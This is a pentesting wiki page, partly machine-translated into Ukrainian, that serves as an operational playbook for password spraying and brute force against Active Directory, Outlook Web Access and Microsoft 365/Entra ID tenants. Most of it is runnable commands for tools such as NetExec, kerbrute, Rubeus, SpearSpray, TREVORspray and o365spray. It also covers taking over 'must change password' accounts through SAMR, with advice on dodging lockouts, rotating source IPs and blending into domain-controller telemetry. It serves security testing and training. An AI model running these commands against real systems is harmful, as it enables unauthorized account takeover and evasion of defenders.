# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Once you have found several **valid usernames** you can try the most **common passwords** (keep in mind the password policy of the environment) with each of the discovered users.\
By **default** the **minimum** **password** **length** is **7**.

Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Зверніть увагу, що ви **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### Get password policy

If you have some user credentials or a shell as a domain user you can **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Експлуатація з Linux (або будь-якої ОС)

- Використовуючи **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Використовуючи **NetExec (CME successor)** для targeted, low-noise spraying через SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(можна вказати кількість спроб, щоб уникнути блокувань):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Використання [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - НЕ РЕКОМЕНДУЄТЬСЯ, ІНОДІ НЕ ПРАЦЮЄ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- За допомогою модуля `scanner/smb/smb_login` у **Metasploit**:

![](<../../images/image (745).png>)

- Використовуючи **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### З Windows

- За допомогою версії [Rubeus](https://github.com/Zer1t0/Rubeus) з модулем brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- За допомогою [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (За замовчуванням може згенерувати користувачів із домену і отримає password policy з домену та обмежить спроби відповідно до неї):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- За допомогою [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Визначити та захопити облікові записи "Password must change at next logon" (SAMR)

Low-noise technique полягає в тому, щоб виконати spray benign/empty password і відловлювати облікові записи, що повертають STATUS_PASSWORD_MUST_CHANGE, що вказує, що password був примусово expired і може бути змінений без знання старого.

Workflow:
- Enumerate users (RID brute via SAMR), щоб побудувати target list:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Спробуйте порожній пароль і продовжуйте при успішних збігах, щоб захопити акаунти, які мають змінити пароль під час наступного входу:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Для кожного збігу змініть пароль через SAMR за допомогою модуля NetExec (старий пароль не потрібен, коли встановлено "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Операційні примітки:
- Переконайтеся, що годинник вашого хоста синхронізований з DC перед Kerberos-based операціями: `sudo ntpdate <dc_fqdn>`.
- `[+]` без `(Pwn3d!)` у деяких модулях (наприклад, RDP/WinRM) означає, що creds valid, але обліковий запис не має interactive logon rights.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying зменшує шум порівняно з SMB/NTLM/LDAP bind attempts і краще узгоджується з політиками блокування AD. SpearSpray поєднує LDAP-driven targeting, pattern engine та policy awareness (domain policy + PSOs + badPwdCount buffer), щоб виконувати spraying точно й безпечно. Також може позначати compromised principals у Neo4j для BloodHound pathing.

Key ideas:
- LDAP user discovery з paging і підтримкою LDAPS, за потреби з custom LDAP filters.
- Domain lockout policy + PSO-aware filtering, щоб залишати configurable attempt buffer (threshold) і не блокувати користувачів.
- Kerberos pre-auth validation через швидкі gssapi bindings (генерує 4768/4771 на DCs замість 4625).
- Pattern-based, per-user password generation з variables на кшталт names і temporal values, отриманих з кожного користувача через pwdLastSet.
- Throughput control через threads, jitter і max requests per second.
- Optional Neo4j integration для позначення owned users для BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Підбір цілей і контроль патернів:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth and safety controls:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound enrichment:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Огляд системи Pattern (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Доступні змінні включають:
- {name}, {samaccountname}
- Temporal з pwdLastSet кожного користувача (або whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers і org token: {separator}, {suffix}, {extra}

Operational notes:
- Надавайте перевагу запитам до PDC-emulator з -dc, щоб читати найавторитетніші дані badPwdCount і policy-related info.
- Скидання badPwdCount спрацьовують на наступній спробі після вікна спостереження; використовуйте threshold і timing, щоб залишатися в безпеці.
- Kerberos pre-auth attempts відображаються як 4768/4771 у telemetry DC; використовуйте jitter і rate-limiting, щоб змішатися з трафіком.

> Tip: За замовчуванням SpearSpray LDAP page size дорівнює 200; за потреби змініть його з -lps.

## Outlook Web Access

Існує кілька інструментів для p**assword spraying outlook**.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (надійний!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Щоб використовувати будь-який із цих інструментів, вам потрібен список користувачів і пароль / невеликий список паролів для spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Для cloud spraying спочатку визначте, чи tenant є **managed**, **federated** чи **hybrid**, тому що endpoint і поведінка lockout можуть відрізнятися від on-prem AD. У Microsoft Entra, **Smart Lockout** змінює те, як повторні guesses споживають lockout budget:

- Повторення **того самого bad password** не продовжує збільшувати lockout counter, але спроби **нових candidates** — так.
- **Familiar** і **unfamiliar** locations мають **окремі** counters.
- Tenants, що використовують **pass-through authentication (PTA)**, не отримують переваги від bad-password hash tracking, тому поводьтеся з ними більше як із класичними targets, чутливими до lockout.

На практиці spray **one password per round**, залишайте достатній spacing між rounds і надавайте перевагу tooling, яке може визначити actual auth flow tenant'а перед надсиланням guesses.

- З [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray) ви можете recon tenant'а, discover `token_endpoint`, spray `msol`/`adfs`/`owa`/`okta` і rotate traffic через multiple egress IPs:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- За допомогою [**Spray365**](https://github.com/MarkoH17/Spray365), ви можете заздалегідь створити відновлюваний **execution plan**, рандомізувати порядок auth і примусово встановити **minimum delay per user**, щоб залишатися поза вікном lockout:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- За допомогою [**o365spray**](https://github.com/0xZDH/o365spray) ви можете validate tenant, enumerate users за допомогою модулів на кшталт `onedrive`, і spray через `oauth2` або `adfs`, зберігаючи **one attempt per user** на кожне lockout window. Якщо у вас уже є FireProx API, передайте його з `--proxy-url`, щоб розподілити source IPs:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Недавні підходи операторів також змістилися в бік **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) підтримує часові вікна, перемішування паролів, ADFS/M365 spraying і автоматичний post-auth exfiltration. Недавні реальні зловживання також використовували **Microsoft Teams API** для переліку акаунтів і **AWS region rotation** для розподілу spray-хвиль між кількома джерельними географіями.

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
